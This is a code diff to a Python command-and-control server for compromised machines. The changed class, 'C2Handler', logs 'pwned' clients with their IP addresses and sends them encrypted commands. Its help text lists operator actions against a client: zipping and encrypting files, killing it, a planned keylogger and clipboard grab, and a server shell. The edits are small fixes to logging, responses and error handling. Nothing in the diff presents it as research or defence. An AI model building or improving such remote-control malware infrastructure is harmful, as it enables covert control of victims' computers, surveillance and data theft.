@@ -115,7 +115,7 @@ class C2Handler(BaseHTTPRequestHandler):
 
                 # Write log file to LOG(pwned.log)
                 with open(LOG, "a") as fileHandle:
-                    fileHandle.write(f"[+] {datetime.now()} - {pwnedDict[pwnedId]} - {clientIp} \n")
+                    fileHandle.write(f"{datetime.now()}, {self.client_address}, {pwnedDict[pwnedId]}\n")
 
             # If the client in pwnedDict and also is Active Session    
             elif client == pwnedDict[activeClient]:
@@ -260,9 +260,7 @@ class C2Handler(BaseHTTPRequestHandler):
                               "client zip FILENAME - zip and encrypt a file on the client",
                               "client unzip FILENAME - unzip and decrypt a file on the client",
                               "client kill - permanently shutdown the active client",
-                              "client delay SECONDS - change the delay setting for a client's reconnection attempts"
-                              " (coming soon)",
-                              "client sleep SECONDS - put the client to sleep for a while (may remove soon)",
+                              "client delay SECONDS - change the delay setting for a client's reconnection attempts",
                               "client get clipboard - grab a copy of the client's clipboard (coming soon)",
                               "client keylog on - start up a keylogger on the client (coming soon)",
                               "client keylog off - turn off the keylogger on the client and write the results to disk"
@@ -285,7 +283,7 @@ class C2Handler(BaseHTTPRequestHandler):
                               "server shell - obtain a shell on the server", sep="\n")
 
                     # Must respond to the client after a server command to cleanly finish the connection
-                    # self.http_response(204)
+                    self.http_response(204)
 
 
                 # Else Command is not a special,
@@ -299,7 +297,7 @@ class C2Handler(BaseHTTPRequestHandler):
 
                         # Write the Command back to the client as a Response; must use UTF-8 for encoding
                         self.wfile.write(cipher.encrypt(command.encode()))
-                    except BrokenPipeError:
+                    except OSError:
                         # Print lost connection message
                         print(Fore.RED + f"[!] Lost Connection to {pwnedDict[activeClient]}. \n" + Fore.RESET)
                         get_new_client()
